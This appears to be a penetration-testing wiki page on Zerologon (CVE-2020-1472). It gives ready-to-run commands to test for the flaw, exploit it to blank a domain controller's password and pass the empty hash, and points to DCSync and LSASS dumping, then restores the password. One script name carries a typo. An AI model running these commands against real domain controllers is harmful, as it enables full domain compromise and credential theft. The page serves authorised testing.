# 🕷️ Zerologon [CVE-2020-1472]
---

> [!CAUTION]
> Following exploit **changes the password** of a domain controller's account, which **breaks communications with other domain controllers** (DCSync) until you will restore the original password.

#### 🤓 RTFM

Everything is explained [here](https://www.secura.com/blog/zero-logon).

Long story short, this exploit consists in sending authentication requests to the domain controller as itself - *i.e. `DC_NAME$`* - with an empty password until it accepts one of them. Once you are authenticated, the exploit sets the password of the domain controller account as empty.

#### 📝 Prerequisites

- Network route to the domain controller.

#### 🛠️ Do it!

First, check if a domain controller is vulnerable to ZeroLogon.

# [NetExec](#tab/netexec)

[NetExec](https://github.com/Pennyw0rth/NetExec) is a cross platform network execution tool, the successor of [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec).

```bash
# You don't need to be authenticated on the domain.
nxc smb $DomainControllerIP -M zerologon
```

# [SecuraBV](#tab/securabv)

You can also use [SecuraBV GitHub repository](https://github.com/SecuraBV/CVE-2020-1472).

```bash
python3 zerologon_tester.py $DomainControllerHostname $DomainControllerIP
```

---

If the domain controller appears to be vulnerable, you can attempt the exploit with this [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472).

```bash
python3 cve-202-1472-exploit.py $DomainControllerHostname $DomainControllerIP
```

This will set the **domain controller's account password as empty**. So you are now able to do [Pass the Hash](/docs/active-directory/lateralization/pass-the-hash.html) with the following one `:31d6cfe0d16ae931b73c59d7e0c089c0` which corresponds to an empty password, or by using `-no-pass`-ish argument.

#### 🏆 What's next?

The best option at this point is to perform [DCSync](/docs/active-directory/privilege-escalation/dc-sync.html) attack.

> [!IMPORTANT]
> **Don't forget to restore the password afterwards!**
>
> As explained in [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472), if you have a recent version of [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), you should be able extract the `hex_plain_text` version of the domain controller's previous password. If not, you can still retrieve it by [dumping LSASS cached credentials](/docs/windows/privilege-escalation/credentials-extraction.html).
>
> ```bash
> # Don't put the trailing `$` at the end of domain controller hostname.
> python3 restorepassword.py $Domain/$DomainControllerHostname@$DomainControllerHostname -target-ip $DomainControllerIP -hexpass $HexPlainText
> ```
> 
> To be sure, check the password is not empty anymore. Following command should fail.
> 
> ```bash
> nxc smb $DomainControllerIP -u "$DomainControllerHostname\$" -H '31d6cfe0d16ae931b73c59d7e0c089c0'
> ```